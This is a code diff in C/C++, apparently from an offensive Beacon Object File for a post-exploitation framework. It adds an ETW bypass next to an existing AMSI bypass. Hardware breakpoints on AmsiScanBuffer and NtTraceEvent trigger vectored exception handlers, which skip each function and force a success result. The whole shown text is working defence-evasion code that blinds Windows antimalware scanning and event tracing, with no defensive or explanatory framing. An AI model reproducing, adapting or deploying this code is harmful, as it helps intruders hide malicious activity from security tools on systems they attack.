@@ -4,9 +4,13 @@
 #include <windows.h>
 #include "utils.h"
 
+#define AMSI_BP_IDX 0
+#define ETW_BP_IDX 1
+
 static const int AMSI_RESULT_CLEAN = 0;
 
 static __attribute__((section(".data")))  PVOID g_amsiScanBufferPtr = nullptr;
+static __attribute__((section(".data")))  PVOID g_NtTraceEventPtr = nullptr;
 
 static unsigned long long setBits(unsigned long long dw, int lowBit, int bits, unsigned long long newValue) {
     unsigned long long mask = (1UL << bits) - 1UL;
@@ -141,12 +145,40 @@ static void handleAMSIBypass(PEXCEPTION_POINTERS exceptions){
     setResult(exceptions->ContextRecord, S_OK);
 }
 
-static LONG WINAPI exceptionHandler(PEXCEPTION_POINTERS exceptions){
+static void handleETWBypass(PEXCEPTION_POINTERS exceptions){
 
+    ULONG_PTR returnAddress = getReturnAddress(exceptions->ContextRecord);
+
+    //update the current instruction pointer to the caller of AmsiScanBuffer
+    setIP(exceptions->ContextRecord, returnAddress);
+
+    adjustStackPointer(exceptions->ContextRecord, sizeof(PVOID));
+
+    setResult(exceptions->ContextRecord, S_OK);
+}
+
+
+static LONG WINAPI amsiExceptionHandler(PEXCEPTION_POINTERS exceptions){
+
+    //log("[+] hit handler 1",0);
     if(exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
             (exceptions->ExceptionRecord->ExceptionAddress == g_amsiScanBufferPtr )){
 
         handleAMSIBypass(exceptions);
+        return EXCEPTION_CONTINUE_EXECUTION;
+
+    }else{
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+}
+
+static LONG WINAPI etwExceptionHandler(PEXCEPTION_POINTERS exceptions){
+
+    //log("[+] hit handler 2", 0);
+    if(exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
+            (exceptions->ExceptionRecord->ExceptionAddress == g_NtTraceEventPtr )){
+
+        handleETWBypass(exceptions);
         return EXCEPTION_CONTINUE_EXECUTION;
 
     }else{
@@ -206,24 +238,45 @@ static void clearHardwareBreakpoint(int bpIndex){
     }
 }
 
-static HANDLE setupBypasses(){
+static HANDLE setupAmsiBypasses(){
 
     BOF_LOCAL(KERNEL32, AddVectoredExceptionHandler);
 
     g_amsiScanBufferPtr = getFunction("amsi.dll", "AmsiScanBuffer");
 
-    if(g_amsiScanBufferPtr == nullptr){
+
+    if (g_amsiScanBufferPtr == nullptr){
+        log("[-] Failed to set A handler", 0);
         return nullptr;
     }
 
     //add our vectored exception handler
-    HANDLE hExHandler = AddVectoredExceptionHandler(1, exceptionHandler);
+    HANDLE hExHandler = AddVectoredExceptionHandler(1, amsiExceptionHandler);
 
     if(g_amsiScanBufferPtr != nullptr){
-        enableBreakpoint(g_amsiScanBufferPtr, 0);
+        enableBreakpoint(g_amsiScanBufferPtr, AMSI_BP_IDX);
     }
 
     return hExHandler;
+}
+
+static HANDLE setupETWBypass(){
+    BOF_LOCAL(KERNEL32, AddVectoredExceptionHandler);
+    g_NtTraceEventPtr = getFunction("ntdll.dll", "NtTraceEvent");
+
+    if (g_NtTraceEventPtr == nullptr){
+        log("[-] Failed to set E handler", 0);
+        return nullptr;
+    }
+
+    HANDLE hExHandler = AddVectoredExceptionHandler(1, etwExceptionHandler);
+
+    if (g_NtTraceEventPtr != nullptr){
+        enableBreakpoint(g_NtTraceEventPtr, ETW_BP_IDX);
+    }
+
+    return hExHandler;
+
 }
 
 static void clearBypasses(HANDLE hExHandler){
